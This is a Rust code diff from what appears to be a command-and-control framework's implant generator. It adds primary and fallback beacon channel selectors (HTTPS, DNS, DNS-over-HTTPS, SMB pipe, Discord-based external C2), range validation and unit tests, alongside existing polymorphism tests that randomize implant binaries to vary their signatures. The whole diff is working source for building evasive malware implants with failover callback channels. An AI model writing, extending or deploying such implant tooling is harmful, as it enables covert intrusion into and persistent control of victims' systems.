@@ -220,6 +220,16 @@ pub struct GenerateRequest {
     /// Use TLS for beacon transport. Default true.
     #[serde(default = "default_tls")]
     pub tls: bool,
+    /// Primary channel selector (implant `Channel` enum value 0-8). Default 0
+    /// (Https). Paired on the wire with `fallback_bitmap` (spec-1 tail).
+    #[serde(default)]
+    pub primary_channel: u8,
+    /// Automatic-failover chain bitmap: bit N = `Channel` enum value N;
+    /// 0 = the implant's build-time default chain (backward compat). Bits 5-7
+    /// (ExtC2) are ignored implant-side by design
+    /// (`next_fallback_with_bitmap`); operator SetChannel is NOT gated.
+    #[serde(default)]
+    pub fallback_bitmap: u8,
     /// Features bitmap. See the architecture doc for bit definitions.
     #[serde(default)]
     pub features: u32,
@@ -505,6 +515,88 @@ mod tests {
     }
 }
 
+// ── spec-1 channel tail: generation-time primary_channel/fallback_bitmap ────
+
+#[cfg(test)]
+mod channel_tail_tests {
+    use super::{build_implant_config, check_request_fields, GenerateRequest, StatusCode};
+    use nyx_protocol::wire::Reader;
+
+    fn req() -> GenerateRequest {
+        GenerateRequest {
+            callback: "10.0.0.1".into(),
+            port: 8443,
+            format: "dll".into(),
+            uri: "/beacon".into(),
+            sleep: 60,
+            jitter: 20,
+            tls: true,
+            primary_channel: 0,
+            fallback_bitmap: 0,
+            features: 0,
+            keying: 0,
+            expires: None,
+            notes: None,
+            deliver: None,
+        }
+    }
+
+    /// Walk the head fields and return the reader positioned at the tail.
+    fn head<'a>(blob: &'a [u8]) -> Reader<'a> {
+        let mut r = Reader::new(blob);
+        r.str().unwrap(); // callback
+        r.u16().unwrap(); // port
+        r.str().unwrap(); // uri
+        r.u32().unwrap(); // sleep
+        r.u8().unwrap(); // jitter
+        r.u8().unwrap(); // tls
+        assert_eq!(r.u8().unwrap(), 1); // has_token
+        assert_eq!(r.blob().unwrap().len(), 32); // auth_token
+        r.u32().unwrap(); // features
+        r.u32().unwrap(); // keying
+        r.u64().unwrap(); // expires_at
+        r
+    }
+
+    #[test]
+    fn tail_carries_channel_selectors() {
+        let mut q = req();
+        q.primary_channel = 2; // Dns
+        q.fallback_bitmap = 0b110; // DohDns | Dns
+        let (blob, _) = build_implant_config(&q, [7u8; 32]).unwrap();
+        let mut r = head(&blob);
+        assert_eq!(r.u8().unwrap(), 2, "primary_channel");
+        assert_eq!(r.u8().unwrap(), 0b110, "fallback_bitmap");
+        for i in 0..4 {
+            assert_eq!(r.str().unwrap(), "", "channel param string {i}");
+        }
+        assert_eq!(
+            r.remaining(),
+            0,
+            "tail must end the blob (spec-7/3 layers absent)"
+        );
+    }
+
+    #[test]
+    fn tail_defaults_keep_legacy_shape_semantics() {
+        // bitmap = 0 with a present tail must mean "default chain", identical
+        // to legacy configs that stop after expires_at.
+        let (blob, _) = build_implant_config(&req(), [0u8; 32]).unwrap();
+        let mut r = head(&blob);
+        assert_eq!(r.u8().unwrap(), 0);
+        assert_eq!(r.u8().unwrap(), 0);
+    }
+
+    #[test]
+    fn primary_channel_past_enum_is_rejected() {
+        let mut q = req();
+        q.primary_channel = 9;
+        let err = check_request_fields(&q).unwrap_err();
+        assert_eq!(err.0, StatusCode::BAD_REQUEST);
+        assert!(err.1.contains("primary_channel"));
+    }
+}
+
 // ── WP-G polymorphism smoke tests (first increment: randomized .nyx_cfg tail
 //    + random PE overlay) ────────────────────────────────────────────────────
 
@@ -546,6 +638,8 @@ mod polymorphism_tests {
             sleep: 60,
             jitter: 20,
             tls: true,
+            primary_channel: 0,
+            fallback_bitmap: 0,
             features: 0,
             keying: 0,
             expires: None,
@@ -560,15 +654,8 @@ mod polymorphism_tests {
         let mut binary = synthetic_template();
         let req = test_request();
         let ct = [0x42u8; 120]; // dummy ciphertext+tag, well under the 900 cap
-        patch_implant_template(
-            &mut binary,
-            &req,
-            [0x11; 32],
-            [0x22; 32],
-            [0x33; 12],
-            &ct,
-        )
-        .expect("patch must succeed on the synthetic template");
+        patch_implant_template(&mut binary, &req, [0x11; 32], [0x22; 32], [0x33; 12], &ct)
+            .expect("patch must succeed on the synthetic template");
         binary
     }
 
@@ -755,6 +842,16 @@ fn check_request_fields(req: &GenerateRequest) -> Result<(), (StatusCode, String
              enabled at generation time: the server cannot mirror the target's \
              runtime username/SID/MAC/tick-count. Omit `keying` or set it to 0."
                 .into(),
+        ));
+    }
+    // Channel selector range: the implant `Channel` enum is 0..=8
+    // (DiscordApi = 8). A value past the enum decodes fine but can never
+    // resolve to a sender — fail closed at 400 rather than ship a
+    // mis-channeled implant.
+    if req.primary_channel > 8 {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "primary_channel must be 0-8 (implant Channel enum)".into(),
         ));
     }
     Ok(())
@@ -977,6 +1074,19 @@ fn build_implant_config(
         })?,
     };
     pw.u64(expires_ts);
+    // spec-1 channel-dispatcher tail: the primary/fallback selector pair,
+    // then the four channel-param strings (DoH resolver, SMB pipe name,
+    // ExtC2 api host/token) written EMPTY — generation-time delivery for
+    // those is not wired, and the implant decodes empty strings identically
+    // to an absent tail. Writing the tail unconditionally keeps every
+    // generated config the same wire shape (the implant tolerates both
+    // forms; config_placeholder.rs::load_runtime_config_parse_tail).
+    pw.u8(req.primary_channel);
+    pw.u8(req.fallback_bitmap);
+    for _ in 0..4 {
+        pw.str("")
+            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    }
     let config_plaintext = pw.into_bytes();
 
     Ok((config_plaintext, expires_ts))
